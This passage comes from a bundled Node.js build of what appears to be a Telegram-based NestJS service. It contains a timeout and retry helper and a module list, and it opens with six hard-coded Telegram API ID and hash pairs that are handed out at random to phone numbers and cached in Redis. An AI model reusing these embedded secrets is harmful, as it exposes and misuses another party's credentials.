const API_CREDENTIALS = [
    { apiId: 27919939, apiHash: "5ed3834e741b57a560076a1d38d2fa94" },
    { apiId: 25328268, apiHash: "b4e654dd2a051930d0a30bb2add80d09" },
    { apiId: 12777557, apiHash: "05054fc7885dcfa18eb7432865ea3500" },
    { apiId: 27565391, apiHash: "a3a0a2e895f893e2067dae111b20f2d9" },
    { apiId: 27586636, apiHash: "f020539b6bb5b945186d39b3ff1dd998" },
    { apiId: 29210552, apiHash: "f3dbae7e628b312c829e1bd341f1e9a9" }
];
function pickRandomCredentials() {
    return API_CREDENTIALS[Math.floor(Math.random() * API_CREDENTIALS.length)];
}
async function getCredentialsForMobile(mobile, ttl = 24 * 60 * 60 * 60) {
    const redisKey = `tg:credentials:${mobile}`;
    const cached = await redisClient_1.RedisClient.getObject(redisKey);
    if (cached) {
        return cached;
    }
    const creds = pickRandomCredentials();
    logger.log(`[getCredentialsForMobile] Storing credentials in Redis for ${mobile}`);
    await redisClient_1.RedisClient.set(redisKey, creds, ttl);
    return creds;
}


/***/ }),

/***/ "./src/utils/withTimeout.ts":
/*!**********************************!*\
  !*** ./src/utils/withTimeout.ts ***!
  \**********************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.withTimeout = withTimeout;
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
async function withTimeout(promiseFactory, options = {}) {
    const { timeout = 60000, errorMessage = "Operation timeout", throwErr = true, maxRetries = 1, baseDelay = 500, maxDelay = 5000, shouldRetry = defaultShouldRetry, cancelSignal, onTimeout, } = options;
    let lastError;
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        if (cancelSignal?.aborted) {
            lastError = new Error("Operation cancelled");
            break;
        }
        try {
            const task = promiseFactory();
            return await runWithTimeout(task, timeout, cancelSignal, errorMessage);
        }
        catch (err) {
            lastError = err;
            if (!shouldRetry(err, attempt) || attempt === maxRetries)
                break;
            const delay = Math.min(baseDelay * 2 ** (attempt - 1) * (1 + Math.random() * 0.1), maxDelay);
            await (0, Helpers_1.sleep)(delay);
        }
    }
    if (onTimeout) {
        try {
            await onTimeout(lastError, maxRetries);
        }
        catch (cbErr) {
            console.error("onTimeout callback failed:", cbErr);
        }
    }
    return throwErr ? Promise.reject(lastError) : undefined;
}
async function runWithTimeout(promise, timeoutMs, cancelSignal, errorMessage) {
    let timeoutId = null;
    let abortListener = null;
    const start = Date.now();
    try {
        return await new Promise((resolve, reject) => {
            timeoutId = setTimeout(() => {
                const elapsed = Date.now() - start;
                reject(new Error(`${errorMessage ?? "Timeout"}\nElapsed: ${elapsed}ms`));
            }, timeoutMs);
            if (cancelSignal) {
                if (cancelSignal.aborted) {
                    const elapsed = Date.now() - start;
                    reject(new Error(`Operation cancelled\nElapsed: ${elapsed}ms`));
                    return;
                }
                abortListener = () => {
                    const elapsed = Date.now() - start;
                    reject(new Error(`Operation cancelled\nElapsed: ${elapsed}ms`));
                };
                cancelSignal.addEventListener("abort", abortListener, { once: true });
            }
            promise.then(resolve).catch(reject);
        });
    }
    finally {
        if (timeoutId) {
            clearTimeout(timeoutId);
            timeoutId = null;
        }
        if (abortListener && cancelSignal) {
            cancelSignal.removeEventListener("abort", abortListener);
            abortListener = null;
        }
    }
}
function defaultShouldRetry(error, attempt) {
    if (attempt >= 3)
        return false;
    if (error?.message?.toLowerCase().includes("cancelled"))
        return false;
    const msg = (error?.message || "").toLowerCase();
    const code = error?.code;
    return (msg.includes("timeout") ||
        msg.includes("network") ||
        msg.includes("connection") ||
        code === "ECONNRESET" ||
        code === "ENOTFOUND" ||
        code === "ETIMEDOUT");
}


/***/ }),

/***/ "@nestjs/common":
/*!*********************************!*\
  !*** external "@nestjs/common" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/common");

/***/ }),

/***/ "@nestjs/config":
/*!*********************************!*\
  !*** external "@nestjs/config" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/config");

/***/ }),

/***/ "@nestjs/core":
/*!*******************************!*\
  !*** external "@nestjs/core" ***!
  \*******************************/
/***/ ((module) => {

module.exports = require("@nestjs/core");

/***/ }),

/***/ "@nestjs/mapped-types":
/*!***************************************!*\
  !*** external "@nestjs/mapped-types" ***!
  \***************************************/
/***/ ((module) => {

module.exports = require("@nestjs/mapped-types");

/***/ }),

/***/ "@nestjs/mongoose":
/*!***********************************!*\
  !*** external "@nestjs/mongoose" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("@nestjs/mongoose");

/***/ }),

/***/ "@nestjs/platform-express":
/*!*******************************************!*\
  !*** external "@nestjs/platform-express" ***!
  \*******************************************/
/***/ ((module) => {

module.exports = require("@nestjs/platform-express");

/***/ }),

/***/ "@nestjs/swagger":
/*!**********************************!*\
  !*** external "@nestjs/swagger" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("@nestjs/swagger");

/***/ }),

/***/ "adm-zip":
/*!**************************!*\
  !*** external "adm-zip" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("adm-zip");

/***/ }),

/***/ "axios":
/*!************************!*\
  !*** external "axios" ***!
  \************************/
/***/ ((module) => {

module.exports = require("axios");

/***/ }),

/***/ "big-integer":
/*!******************************!*\
  !*** external "big-integer" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("big-integer");

/***/ }),

/***/ "chalk":
/*!************************!*\
  !*** external "chalk" ***!
  \************************/
/***/ ((module) => {

module.exports = require("chalk");

/***/ }),

/***/ "class-transformer":
/*!************************************!*\
  !*** external "class-transformer" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("class-transformer");

/***/ }),

/***/ "class-validator":
/*!**********************************!*\
  !*** external "class-validator" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("class-validator");

/***/ }),

/***/ "cloudinary":
/*!*****************************!*\
  !*** external "cloudinary" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("cloudinary");

/***/ }),

/***/ "crypto":
/*!*************************!*\
  !*** external "crypto" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("crypto");

/***/ }),

/***/ "form-data":
/*!****************************!*\
  !*** external "form-data" ***!
  \****************************/
/***/ ((module) => {

module.exports = require("form-data");

/***/ }),

/***/ "fs":
/*!*********************!*\
  !*** external "fs" ***!
  \*********************/
/***/ ((module) => {

module.exports = require("fs");

/***/ }),

/***/ "https":
/*!************************!*\
  !*** external "https" ***!
  \************************/
/***/ ((module) => {

module.exports = require("https");

/***/ }),

/***/ "imap":
/*!***********************!*\
  !*** external "imap" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("imap");

/***/ }),

/***/ "ioredis":
/*!**************************!*\
  !*** external "ioredis" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("ioredis");

/***/ }),

/***/ "lodash":
/*!*************************!*\
  !*** external "lodash" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("lodash");

/***/ }),

/***/ "mongoose":
/*!***************************!*\
  !*** external "mongoose" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("mongoose");

/***/ }),

/***/ "multer":
/*!*************************!*\
  !*** external "multer" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("multer");

/***/ }),

/***/ "node-cache":
/*!*****************************!*\
  !*** external "node-cache" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("node-cache");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("path");

/***/ }),

/***/ "reflect-metadata":
/*!***********************************!*\
  !*** external "reflect-metadata" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("reflect-metadata");

/***/ }),

/***/ "rxjs":
/*!***********************!*\
  !*** external "rxjs" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("rxjs");

/***/ }),

/***/ "rxjs/operators":
/*!*********************************!*\
  !*** external "rxjs/operators" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("rxjs/operators");

/***/ }),

/***/ "telegram":
/*!***************************!*\
  !*** external "telegram" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("telegram");

/***/ }),

/***/ "telegram/Helpers":
/*!***********************************!*\
  !*** external "telegram/Helpers" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("telegram/Helpers");

/***/ }),

/***/ "telegram/Password":
/*!************************************!*\
  !*** external "telegram/Password" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/Password");

/***/ }),

/***/ "telegram/client/uploads":
/*!******************************************!*\
  !*** external "telegram/client/uploads" ***!
  \******************************************/
/***/ ((module) => {

module.exports = require("telegram/client/uploads");

/***/ }),

/***/ "telegram/events":
/*!**********************************!*\
  !*** external "telegram/events" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("telegram/events");

/***/ }),

/***/ "telegram/extensions/Logger":
/*!*********************************************!*\
  !*** external "telegram/extensions/Logger" ***!
  \*********************************************/
/***/ ((module) => {

module.exports = require("telegram/extensions/Logger");

/***/ }),

/***/ "telegram/sessions":
/*!************************************!*\
  !*** external "telegram/sessions" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/sessions");

/***/ }),

/***/ "telegram/tl":
/*!******************************!*\
  !*** external "telegram/tl" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("telegram/tl");

/***/ }),

/***/ "url":
/*!**********************!*\
  !*** external "url" ***!
  \**********************/
/***/ ((module) => {

module.exports = require("url");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module is referenced by other modules so it can't be inlined
/******/ 	var __webpack_exports__ = __webpack_require__("./src/main.ts");
/******/ 	var __webpack_export_target__ = exports;
/******/ 	for(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];
/******/ 	if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
/******/ 	
/******/ })()
;
//# sourceMappingURL=index.js.map